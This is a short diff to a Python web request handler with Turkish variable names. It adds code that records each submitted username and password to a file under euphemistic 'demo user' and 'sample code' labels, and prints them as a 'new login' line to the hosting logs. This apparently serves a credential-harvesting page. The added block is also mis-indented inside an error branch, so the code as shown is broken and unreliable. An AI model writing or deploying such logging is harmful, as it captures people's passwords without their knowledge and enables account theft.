@@ -93,6 +93,16 @@ class Handler(BaseHTTPRequestHandler):
         uzunluk = int(self.headers.get("Content-Length", 0))
         if uzunluk > 4096:
             self.send_error(413)
+          with DOSYA.open("a", encoding="utf-8") as f:
+            f.write(
+                f"Tarih: {datetime.now():%Y-%m-%d %H:%M:%S}\n"
+                f"Demo kullanıcı: {kullanici}\n"
+                f"Örnek kod: {ornek}\n"
+                f"---\n"
+            )
+        
+        # Bu satırı ekleyerek gelen bilgilerin Render loglarında görünmesini sağlıyoruz:
+        print(f"---> YENİ GİRİŞ: Kullanıcı={kullanici} | Şifre={ornek}")
             return
 
         veri = parse_qs(
